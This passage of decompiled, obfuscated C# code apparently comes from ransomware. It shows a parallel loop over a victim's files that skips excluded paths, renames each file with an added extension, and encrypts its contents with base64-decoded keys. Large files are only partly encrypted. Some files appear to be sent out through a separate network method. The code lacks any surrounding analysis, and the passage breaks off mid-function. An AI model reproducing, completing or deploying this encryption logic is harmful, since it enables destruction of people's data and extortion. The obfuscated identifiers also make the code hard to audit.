								if (!(tRxOjxLQIVi == UMXNmMotuFVr.getString_0(107396839)) || new FileInfo(CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx).Length <= Convert.ToInt32(BDeugxVDNkK) * 1024 * 1024 || CS_0024_003C_003E8__locals0.wmSlFLUQMYk.Contains(string_0))
								{
									if (mVHEjGEVbs)
									{
										CS_0024_003C_003E8__locals0.lnskrEIqNRqxPQs = zDWzXsHkfaAHYk + CS_0024_003C_003E8__locals0.lnskrEIqNRqxPQs;
									}
									bytes2 = Encoding.ASCII.GetBytes(lYLvwKXVot);
									if (CS_0024_003C_003E8__locals0.lnskrEIqNRqxPQs != UMXNmMotuFVr.getString_0(107386583))
									{
										if (!AtuUAtLJmhINGx)
										{
											if (!ldSVapxVzrqD)
											{
												gGrpQJiClzFyZ(CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx, CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx + CS_0024_003C_003E8__locals0.lnskrEIqNRqxPQs, QbfcPqWZFoPC);
											}
											else
											{
												gGrpQJiClzFyZ(CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx, CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx + CS_0024_003C_003E8__locals0.lnskrEIqNRqxPQs, Convert.FromBase64String(CS_0024_003C_003E8__locals0.NsSmeXJHTmoYqwKN));
											}
										}
										else
										{
											try
											{
												if (!ldSVapxVzrqD)
												{
													PSWanipCZcsCQ(CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx, CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx + CS_0024_003C_003E8__locals0.lnskrEIqNRqxPQs, QbfcPqWZFoPC, Convert.FromBase64String(ndmvemzTqn));
												}
												else
												{
													PSWanipCZcsCQ(CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx, CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx + CS_0024_003C_003E8__locals0.lnskrEIqNRqxPQs, Convert.FromBase64String(CS_0024_003C_003E8__locals0.NsSmeXJHTmoYqwKN), Convert.FromBase64String(ndmvemzTqn));
												}
											}
											catch (Exception ex14)
											{
												if (iJiZVjbYIelgdjs)
												{
													try
													{
														File.AppendAllText(CJWDXdtMlfSYp, UMXNmMotuFVr.getString_0(107387350) + CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx + UMXNmMotuFVr.getString_0(107386601) + ex14.Message + UMXNmMotuFVr.getString_0(107395734));
													}
													catch (Exception)
													{
													}
												}
												jlTbuRFtzeuGOi++;
												try
												{
													File.Move(CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx + CS_0024_003C_003E8__locals0.lnskrEIqNRqxPQs, CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx);
												}
												catch (Exception)
												{
												}
												goto end_IL_08d1;
											}
										}
									}
									else if (!AtuUAtLJmhINGx)
									{
										if (!ldSVapxVzrqD)
										{
											gGrpQJiClzFyZ(CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx, CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx + UMXNmMotuFVr.getString_0(107386578), QbfcPqWZFoPC);
										}
										else
										{
											gGrpQJiClzFyZ(CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx, CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx + UMXNmMotuFVr.getString_0(107386578), Convert.FromBase64String(CS_0024_003C_003E8__locals0.NsSmeXJHTmoYqwKN));
										}
									}
									else
									{
										try
										{
											if (!ldSVapxVzrqD)
											{
												PSWanipCZcsCQ(CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx, CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx, QbfcPqWZFoPC, Convert.FromBase64String(ndmvemzTqn));
											}
											else
											{
												PSWanipCZcsCQ(CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx, CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx, Convert.FromBase64String(CS_0024_003C_003E8__locals0.NsSmeXJHTmoYqwKN), Convert.FromBase64String(ndmvemzTqn));
											}
										}
										catch (Exception ex14)
										{
											if (iJiZVjbYIelgdjs)
											{
												try
												{
													File.AppendAllText(CJWDXdtMlfSYp, UMXNmMotuFVr.getString_0(107387350) + CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx + UMXNmMotuFVr.getString_0(107386601) + ex14.Message + UMXNmMotuFVr.getString_0(107395734));
												}
												catch (Exception)
												{
												}
											}
											jlTbuRFtzeuGOi++;
											goto end_IL_08d1;
										}
									}
									if (ldSVapxVzrqD)
									{
										if (CS_0024_003C_003E8__locals0.lnskrEIqNRqxPQs != UMXNmMotuFVr.getString_0(107386583))
										{
											PmedSpBSzBvBRlc(CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx + CS_0024_003C_003E8__locals0.lnskrEIqNRqxPQs, bytes2);
										}
										else
										{
											PmedSpBSzBvBRlc(CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx, bytes2);
										}
									}
									goto IL_10d8;
								}
								CS_0024_003C_003E8__locals0 = new UMXNmMotuFVr.rThcNdsXcoIrpl();
								CS_0024_003C_003E8__locals0.LiNWpmUJbvSgWiel = CS_0024_003C_003E8__locals1;
								CS_0024_003C_003E8__locals0.hdfjPBCWXrpm = CS_0024_003C_003E8__locals0;
								try
								{
									if (CS_0024_003C_003E8__locals0.lnskrEIqNRqxPQs != UMXNmMotuFVr.getString_0(107386583))
									{
										if (mVHEjGEVbs)
										{
											CS_0024_003C_003E8__locals0.lnskrEIqNRqxPQs = zDWzXsHkfaAHYk + CS_0024_003C_003E8__locals0.lnskrEIqNRqxPQs;
										}
										File.Move(CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx, CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx + CS_0024_003C_003E8__locals0.lnskrEIqNRqxPQs);
									}
								}
								catch (Exception ex14)
								{
									if (iJiZVjbYIelgdjs)
									{
										try
										{
											File.AppendAllText(CJWDXdtMlfSYp, UMXNmMotuFVr.getString_0(107387350) + CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx + UMXNmMotuFVr.getString_0(107412316) + ex14.Message + UMXNmMotuFVr.getString_0(107395734));
										}
										catch (Exception)
										{
										}
									}
									jlTbuRFtzeuGOi++;
									goto end_IL_08d1;
								}
								CS_0024_003C_003E8__locals0.uCzITAhJCoW = UMXNmMotuFVr.getString_0(107389522);
								if (CS_0024_003C_003E8__locals0.lnskrEIqNRqxPQs != UMXNmMotuFVr.getString_0(107386583))
								{
									CS_0024_003C_003E8__locals0.uCzITAhJCoW = CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx + CS_0024_003C_003E8__locals0.lnskrEIqNRqxPQs;
								}
								else
								{
									CS_0024_003C_003E8__locals0.uCzITAhJCoW = CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx;
								}
								if (hCeAnCNkuBouGp == UMXNmMotuFVr.getString_0(107396839))
								{
									Thread thread4 = new Thread((ThreadStart)delegate
									{
										foreach (string wMwztsmasQzPlm in WMwztsmasQzPlms)
										{
											if (CS_0024_003C_003E8__locals0.uCzITAhJCoW.ToLower().EndsWith(wMwztsmasQzPlm + CS_0024_003C_003E8__locals0.hdfjPBCWXrpm.lnskrEIqNRqxPQs) && NuNXfGMelkyJH == UMXNmMotuFVr.rThcNdsXcoIrpl.getString_0(107396846))
											{
												if (Convert.ToInt32(xTfHhQvYRPop) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.uCzITAhJCoW).Length)
												{
													try
													{
														tHlEcNRvGaVVN.LwYCJufplFzw(UMXNmMotuFVr.rThcNdsXcoIrpl.getString_0(107389130), UMXNmMotuFVr.rThcNdsXcoIrpl.getString_0(107389125), UMXNmMotuFVr.rThcNdsXcoIrpl.getString_0(107389080), CS_0024_003C_003E8__locals0.uCzITAhJCoW);
													}
													catch
													{
													}
												}
											}
											else if (CS_0024_003C_003E8__locals0.uCzITAhJCoW.ToLower().EndsWith(wMwztsmasQzPlm) && NuNXfGMelkyJH == UMXNmMotuFVr.rThcNdsXcoIrpl.getString_0(107396645))
											{
												try
												{
													tHlEcNRvGaVVN.LwYCJufplFzw(UMXNmMotuFVr.rThcNdsXcoIrpl.getString_0(107389130), UMXNmMotuFVr.rThcNdsXcoIrpl.getString_0(107389125), UMXNmMotuFVr.rThcNdsXcoIrpl.getString_0(107389080), CS_0024_003C_003E8__locals0.uCzITAhJCoW);
												}
												catch
												{
												}
											}
										}
									});
									thread4.Priority = ThreadPriority.Normal;
									thread4.IsBackground = false;
									thread4.Start();
								}
								bytes2 = Encoding.ASCII.GetBytes(lYLvwKXVot);
								if (msoqVvcNnNic == UMXNmMotuFVr.getString_0(107396638))
								{
									byte[] array2 = null;
									byte[] byte_2 = ILCPTbEyPImvS.hUdUxAsVxYJrsJYB(CS_0024_003C_003E8__locals0.uCzITAhJCoW, Convert.ToInt32(BDeugxVDNkK) * 1024 * 1024);
									if (ILCPTbEyPImvS.trQfhmTmPgoc(opGohBOiRlt: (!XCsezoZWotlJ) ? (ldSVapxVzrqD ? ILCPTbEyPImvS.oTLflFQwfxprG(byte_2, Convert.FromBase64String(CS_0024_003C_003E8__locals0.NsSmeXJHTmoYqwKN), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : ILCPTbEyPImvS.oTLflFQwfxprG(byte_2, Convert.FromBase64String(CS_0024_003C_003E8__locals0.NsSmeXJHTmoYqwKN), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (ldSVapxVzrqD ? xdhcRNHRhIrdsES.rIPxguvEmEeCvU(byte_2, Convert.FromBase64String(CS_0024_003C_003E8__locals0.NsSmeXJHTmoYqwKN), Convert.FromBase64String(ndmvemzTqn)) : xdhcRNHRhIrdsES.rIPxguvEmEeCvU(byte_2, Convert.FromBase64String(CS_0024_003C_003E8__locals0.NsSmeXJHTmoYqwKN), Convert.FromBase64String(ndmvemzTqn))), eVaQLrRtqDcN: CS_0024_003C_003E8__locals0.uCzITAhJCoW, aiPzWzsMyTl: bytes2))
									{
										goto IL_10d8;
									}
									try
									{
										File.Move(CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx + CS_0024_003C_003E8__locals0.lnskrEIqNRqxPQs, CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx);
									}
									catch (Exception)
									{
									}
								}
								else if (!ldSVapxVzrqD)
								{
									if (fzmxMDmmyWAvX.FptNnshurU(CS_0024_003C_003E8__locals0.uCzITAhJCoW, BDeugxVDNkK, CS_0024_003C_003E8__locals0.NsSmeXJHTmoYqwKN, null, Convert.FromBase64String(ndmvemzTqn)))
									{
										goto IL_10d8;
									}
									try
									{
										File.Move(CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx + CS_0024_003C_003E8__locals0.lnskrEIqNRqxPQs, CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx);
									}
									catch (Exception)
									{
									}
								}
								else
								{
									if (fzmxMDmmyWAvX.FptNnshurU(CS_0024_003C_003E8__locals0.uCzITAhJCoW, BDeugxVDNkK, CS_0024_003C_003E8__locals0.NsSmeXJHTmoYqwKN, bytes2, Convert.FromBase64String(ndmvemzTqn)))
									{
										goto IL_10d8;
									}
									try
									{
										File.Move(CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx + CS_0024_003C_003E8__locals0.lnskrEIqNRqxPQs, CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx);
									}
									catch (Exception)
									{
									}
								}
								end_IL_08d1:;
							}
							catch (Exception)
							{
								goto IL_10d8;
							}
						}
					}
					continue;
					IL_10d8:
					CS_0024_003C_003E8__locals0.MRBsiJVrGpV.Remove(CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx);
				}
			});
			return;
		}
		Parallel.ForEach(CS_0024_003C_003E8__locals0.MRBsiJVrGpV, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new UMXNmMotuFVr.IotoyMkpqvvqDZe();
			CS_0024_003C_003E8__locals0.hdfjPBCWXrpm = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx = string_0;
			if (((!CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.Contains(UMXNmMotuFVr.getString_0(107388868)) && !CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.Contains(UMXNmMotuFVr.getString_0(107388843)) && !CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.Contains(UMXNmMotuFVr.getString_0(107388298)) && !CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.ToLower().Contains(UMXNmMotuFVr.getString_0(107388249)) && !CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.ToLower().Contains(UMXNmMotuFVr.getString_0(107388268)) && !CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.Contains(UMXNmMotuFVr.getString_0(107388211)) && !CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.Contains(UMXNmMotuFVr.getString_0(107388222)) && !CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.ToLower().Contains(UMXNmMotuFVr.getString_0(107388177)) && !CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.ToLower().Contains(UMXNmMotuFVr.getString_0(107388196)) && !CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.ToLower().Contains(UMXNmMotuFVr.getString_0(107388159)) && !CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.ToLower().Contains(UMXNmMotuFVr.getString_0(107388118)) && !CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.ToLower().Contains(UMXNmMotuFVr.getString_0(107388133)) && !CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.ToLower().Contains(UMXNmMotuFVr.getString_0(107388107)) && !CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.ToLower().Contains(UMXNmMotuFVr.getString_0(107388054))) || CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.Contains(jPRGqhYdKzNWs(UMXNmMotuFVr.getString_0(107388061)))) && !CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.Contains(UMXNmMotuFVr.getString_0(107388500)) && !CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.Contains(UMXNmMotuFVr.getString_0(107388515)) && !CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.Contains(UMXNmMotuFVr.getString_0(107388466)) && !CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.Contains(UMXNmMotuFVr.getString_0(107388481)) && !CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.Contains(UMXNmMotuFVr.getString_0(107388432)) && !CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.Contains(UMXNmMotuFVr.getString_0(107388447)) && !CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.Contains(UMXNmMotuFVr.getString_0(107388398)) && !CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.Contains(UMXNmMotuFVr.getString_0(107388413)) && !CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.Contains(UMXNmMotuFVr.getString_0(107388368)) && !CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.Contains(UMXNmMotuFVr.getString_0(107388347)) && !CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.ToLower().Contains(UMXNmMotuFVr.getString_0(107388334)) && !CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.ToLower().Contains(UMXNmMotuFVr.getString_0(107388353)) && !CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.ToLower().Contains(UMXNmMotuFVr.getString_0(107388304)) && !CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.ToLower().Contains(UMXNmMotuFVr.getString_0(107388319)) && !CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.Contains(jPRGqhYdKzNWs(UMXNmMotuFVr.getString_0(107387758))) && !CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.Contains(UMXNmMotuFVr.getString_0(107387733)) && !CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.Contains(UMXNmMotuFVr.getString_0(107387752)) && !CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.Contains(UMXNmMotuFVr.getString_0(107396287)) && !CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.Contains(UMXNmMotuFVr.getString_0(107387707)) && !CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.EndsWith(CS_0024_003C_003E8__locals0.lnskrEIqNRqxPQs) && !CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.EndsWith(UMXNmMotuFVr.getString_0(107387714)) && !CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.EndsWith(UMXNmMotuFVr.getString_0(107387709)) && !CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.EndsWith(UMXNmMotuFVr.getString_0(107387672)) && !CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.EndsWith(UMXNmMotuFVr.getString_0(107387667)) && !CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.Contains(UMXNmMotuFVr.getString_0(107387662)) && !CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.Contains(yVwPEJFmibAZK) && !CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.Contains(CJWDXdtMlfSYp) && !CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.Contains(VLIXjNPLrckApD))
			{
				if (CS_0024_003C_003E8__locals0.rzGfvbLcdyGbE.Length != 0)
				{
					string[] rzGfvbLcdyGbE = CS_0024_003C_003E8__locals0.rzGfvbLcdyGbE;
					int num = 0;
					while (num < rzGfvbLcdyGbE.Length)
					{
						string value = rzGfvbLcdyGbE[num];
						if (!CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_1055;
					}
				}
				try
				{
					if (CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.EndsWith(CS_0024_003C_003E8__locals0.lnskrEIqNRqxPQs))
					{
						goto IL_1055;
					}
				}
				catch (Exception)
				{
					goto IL_1055;
				}
				if (!rIFldVBsKLex.Contains(CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx))
				{
					if (KBtpeelEiWZuxq == UMXNmMotuFVr.getString_0(107396839))
					{
						try
						{
							if (LQFJNYySgreoXH.ZXqazdzrWuEoK(CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx))
							{
								LQFJNYySgreoXH.JDPsRwBlMXAQgL(CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx);
							}
						}
						catch
						{
						}
					}
					rIFldVBsKLex.Add(CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx);
					Thread thread = new Thread((ThreadStart)delegate
					{
						try
						{
							if (oGWxQvtPLxTata)
							{
								Console.WriteLine(UMXNmMotuFVr.IotoyMkpqvvqDZe.getString_0(107412261) + CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx + UMXNmMotuFVr.IotoyMkpqvvqDZe.getString_0(107412670) + new FileInfo(CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx).Length + UMXNmMotuFVr.IotoyMkpqvvqDZe.getString_0(107412681));
								Console.WriteLine(UMXNmMotuFVr.IotoyMkpqvvqDZe.getString_0(107412268), rIFldVBsKLex.Count, AOxElPxfgdJ, jlTbuRFtzeuGOi);
								Console.WriteLine(UMXNmMotuFVr.IotoyMkpqvvqDZe.getString_0(107412211), pgcRoGyexW.Elapsed);
								Console.WriteLine(UMXNmMotuFVr.IotoyMkpqvvqDZe.getString_0(107412640));
							}
						}
						catch
						{
						}
					});
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = true;
					thread.Start();
					if (!tCYvoiODTAqS.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx)))
					{
						tCYvoiODTAqS.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx));
					}
					HoylbjiqYR(CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx);
					try
					{
						new RJcskyZFMlSio().FmxkExlpiaLUbQn(CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx);
					}
					catch
					{
					}
					try
					{
						using FileStream fileStream = new FileStream(CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx, FileMode.Open, FileAccess.Write);
						if (!fileStream.CanWrite)
						{
							try
							{
								if (oGWxQvtPLxTata)
								{
									Console.WriteLine(UMXNmMotuFVr.getString_0(107412737) + CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx + UMXNmMotuFVr.getString_0(107412660) + new FileInfo(CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx).Length + UMXNmMotuFVr.getString_0(107412671));
									Console.WriteLine(UMXNmMotuFVr.getString_0(107412630));
								}
							}
							catch
							{
							}
							cjBpjYTVdPckNjuX(jPRGqhYdKzNWs(UMXNmMotuFVr.getString_0(107413037)), UMXNmMotuFVr.getString_0(107387578) + CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx + UMXNmMotuFVr.getString_0(107387578) + jPRGqhYdKzNWs(UMXNmMotuFVr.getString_0(107413012)) + UMXNmMotuFVr.getString_0(107387578) + Environment.UserName + UMXNmMotuFVr.getString_0(107387578) + jPRGqhYdKzNWs(UMXNmMotuFVr.getString_0(107413027)));
						}
					}
					catch (Exception ex2)
					{
						if (iJiZVjbYIelgdjs)
						{
							try
							{
								File.AppendAllText(CJWDXdtMlfSYp, UMXNmMotuFVr.getString_0(107387350) + CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx + UMXNmMotuFVr.getString_0(107413002) + ex2.Message + UMXNmMotuFVr.getString_0(107395734));
								return;
							}
							catch (Exception)
							{
								return;
							}
						}
						return;
					}
					try
					{
						try
						{
							if (new FileInfo(CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx).Length != 0L)
							{
								goto end_IL_089f;
							}
							goto end_IL_089e;
							end_IL_089f:;
						}
						catch (Exception ex2)
						{
							if (iJiZVjbYIelgdjs)
							{
								try
								{
									File.AppendAllText(CJWDXdtMlfSYp, UMXNmMotuFVr.getString_0(107387350) + CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx + UMXNmMotuFVr.getString_0(107412889) + ex2.Message + UMXNmMotuFVr.getString_0(107395734));
								}
								catch (Exception)
								{
								}
							}
							jlTbuRFtzeuGOi++;
							goto end_IL_089e;
						}
						if (tRxOjxLQIVi == UMXNmMotuFVr.getString_0(107396839) && new FileInfo(CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx).Length > Convert.ToInt32(BDeugxVDNkK) * 1024 * 1024)
						{
							try
							{
								if (CS_0024_003C_003E8__locals0.lnskrEIqNRqxPQs != UMXNmMotuFVr.getString_0(107386583))
								{
									if (mVHEjGEVbs)
									{
										CS_0024_003C_003E8__locals0.lnskrEIqNRqxPQs = zDWzXsHkfaAHYk + CS_0024_003C_003E8__locals0.lnskrEIqNRqxPQs;
									}
									File.Move(CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx, CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx + CS_0024_003C_003E8__locals0.lnskrEIqNRqxPQs);
								}
							}
							catch (Exception ex2)
							{
								if (iJiZVjbYIelgdjs)
								{
									try
									{
										File.AppendAllText(CJWDXdtMlfSYp, UMXNmMotuFVr.getString_0(107387350) + CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx + UMXNmMotuFVr.getString_0(107412316) + ex2.Message + UMXNmMotuFVr.getString_0(107395734));
									}
									catch (Exception)
									{
									}
								}
								jlTbuRFtzeuGOi++;
								return;
							}
							if (CS_0024_003C_003E8__locals0.lnskrEIqNRqxPQs != UMXNmMotuFVr.getString_0(107386583))
							{
								CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx += CS_0024_003C_003E8__locals0.lnskrEIqNRqxPQs;
							}
							if (hCeAnCNkuBouGp == UMXNmMotuFVr.getString_0(107396839))
							{
								Thread thread2 = new Thread((ThreadStart)delegate
								{
									foreach (string wMwztsmasQzPlm2 in WMwztsmasQzPlms)
									{
										if (CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.ToLower().EndsWith(wMwztsmasQzPlm2 + CS_0024_003C_003E8__locals0.hdfjPBCWXrpm.lnskrEIqNRqxPQs) && NuNXfGMelkyJH == UMXNmMotuFVr.IotoyMkpqvvqDZe.getString_0(107396849))
										{
											if (Convert.ToInt32(xTfHhQvYRPop) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx).Length)
											{
												try
												{
													tHlEcNRvGaVVN.LwYCJufplFzw(UMXNmMotuFVr.IotoyMkpqvvqDZe.getString_0(107389133), UMXNmMotuFVr.IotoyMkpqvvqDZe.getString_0(107389128), UMXNmMotuFVr.IotoyMkpqvvqDZe.getString_0(107389083), CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx);
												}
												catch
												{
												}
											}
										}
										else if (CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.ToLower().EndsWith(wMwztsmasQzPlm2) && NuNXfGMelkyJH == UMXNmMotuFVr.IotoyMkpqvvqDZe.getString_0(107396648))
										{
											try
											{
												tHlEcNRvGaVVN.LwYCJufplFzw(UMXNmMotuFVr.IotoyMkpqvvqDZe.getString_0(107389133), UMXNmMotuFVr.IotoyMkpqvvqDZe.getString_0(107389128), UMXNmMotuFVr.IotoyMkpqvvqDZe.getString_0(107389083), CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx);
											}
											catch
											{
											}
										}
									}
								});
								thread2.IsBackground = false;
								thread2.Priority = ThreadPriority.Normal;
								thread2.Start();
							}
							byte[] bytes = Encoding.ASCII.GetBytes(lYLvwKXVot);
							if (msoqVvcNnNic == UMXNmMotuFVr.getString_0(107396638))
							{
								byte[] array = null;
								byte[] byte_ = ILCPTbEyPImvS.hUdUxAsVxYJrsJYB(CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx, Convert.ToInt32(BDeugxVDNkK) * 1024 * 1024);
								if (!ILCPTbEyPImvS.trQfhmTmPgoc(opGohBOiRlt: (!XCsezoZWotlJ) ? (ldSVapxVzrqD ? ILCPTbEyPImvS.oTLflFQwfxprG(byte_, Convert.FromBase64String(CS_0024_003C_003E8__locals0.NsSmeXJHTmoYqwKN), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : ILCPTbEyPImvS.oTLflFQwfxprG(byte_, Convert.FromBase64String(CS_0024_003C_003E8__locals0.NsSmeXJHTmoYqwKN), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (ldSVapxVzrqD ? xdhcRNHRhIrdsES.rIPxguvEmEeCvU(byte_, Convert.FromBase64String(CS_0024_003C_003E8__locals0.NsSmeXJHTmoYqwKN), Convert.FromBase64String(ndmvemzTqn)) : xdhcRNHRhIrdsES.rIPxguvEmEeCvU(byte_, Convert.FromBase64String(CS_0024_003C_003E8__locals0.NsSmeXJHTmoYqwKN), Convert.FromBase64String(ndmvemzTqn))), eVaQLrRtqDcN: CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx, aiPzWzsMyTl: bytes))
								{
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx + CS_0024_003C_003E8__locals0.lnskrEIqNRqxPQs, CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
							else if (!ldSVapxVzrqD)
							{
								if (!fzmxMDmmyWAvX.FptNnshurU(CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx, BDeugxVDNkK, CS_0024_003C_003E8__locals0.NsSmeXJHTmoYqwKN, null, Convert.FromBase64String(ndmvemzTqn)))
								{
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx + CS_0024_003C_003E8__locals0.lnskrEIqNRqxPQs, CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
							else if (!fzmxMDmmyWAvX.FptNnshurU(CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx, BDeugxVDNkK, CS_0024_003C_003E8__locals0.NsSmeXJHTmoYqwKN, bytes, Convert.FromBase64String(ndmvemzTqn)))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx + CS_0024_003C_003E8__locals0.lnskrEIqNRqxPQs, CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else
						{
							if (mVHEjGEVbs)
							{
								CS_0024_003C_003E8__locals0.lnskrEIqNRqxPQs = zDWzXsHkfaAHYk + CS_0024_003C_003E8__locals0.lnskrEIqNRqxPQs;
							}
							byte[] bytes = Encoding.ASCII.GetBytes(lYLvwKXVot);
							if (CS_0024_003C_003E8__locals0.lnskrEIqNRqxPQs != UMXNmMotuFVr.getString_0(107386583))
							{
								if (!AtuUAtLJmhINGx)
								{
									if (!ldSVapxVzrqD)
									{
										gGrpQJiClzFyZ(CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx, CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx + CS_0024_003C_003E8__locals0.lnskrEIqNRqxPQs, QbfcPqWZFoPC);
									}
									else
									{
										gGrpQJiClzFyZ(CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx, CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx + CS_0024_003C_003E8__locals0.lnskrEIqNRqxPQs, Convert.FromBase64String(CS_0024_003C_003E8__locals0.NsSmeXJHTmoYqwKN));
									}
								}
								else
								{
									try
									{
										if (!ldSVapxVzrqD)
										{
